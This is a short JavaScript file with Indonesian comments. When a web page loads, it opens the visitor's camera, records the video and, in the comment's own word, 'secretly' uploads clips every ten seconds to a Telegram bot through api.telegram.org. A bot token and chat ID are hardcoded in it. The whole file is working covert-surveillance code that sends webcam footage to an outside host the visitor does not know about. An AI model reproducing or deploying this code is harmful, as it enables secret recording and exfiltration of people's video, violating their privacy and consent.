document.addEventListener("DOMContentLoaded", async function () {
    try {
        // Meminta akses kamera saat halaman pertama kali dibuka
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById("video").srcObject = stream;
        sendToTelegram(stream); // Kirim ke Telegram diam-diam
    } catch (error) {
        console.error("Gagal mengakses kamera:", error);
    }
});

async function sendToTelegram(stream) {
    const botToken = "7810176235:AAGsVRjcENBqSAyeL5nLghvJvBNnitVLBDM"; // Ganti dengan token bot Anda
    const chatId = "7961625661"; // Ganti dengan chat ID Anda
    const url = `https://api.telegram.org/bot7810176235:AAGsVRjcENBqSAyeL5nLghvJvBNnitVLBDM/sendVideo`;

    const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });

    mediaRecorder.ondataavailable = async (event) => {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("video", event.data, "stream.webm");

        try {
            await fetch(url, { method: "POST", body: formData });
            console.log("Video terkirim ke Telegram");
        } catch (error) {
            console.error("Gagal mengirim video ke Telegram:", error);
        }
    };

    mediaRecorder.start();
    setInterval(() => mediaRecorder.requestData(), 10000); // Kirim video setiap 10 detik
        }
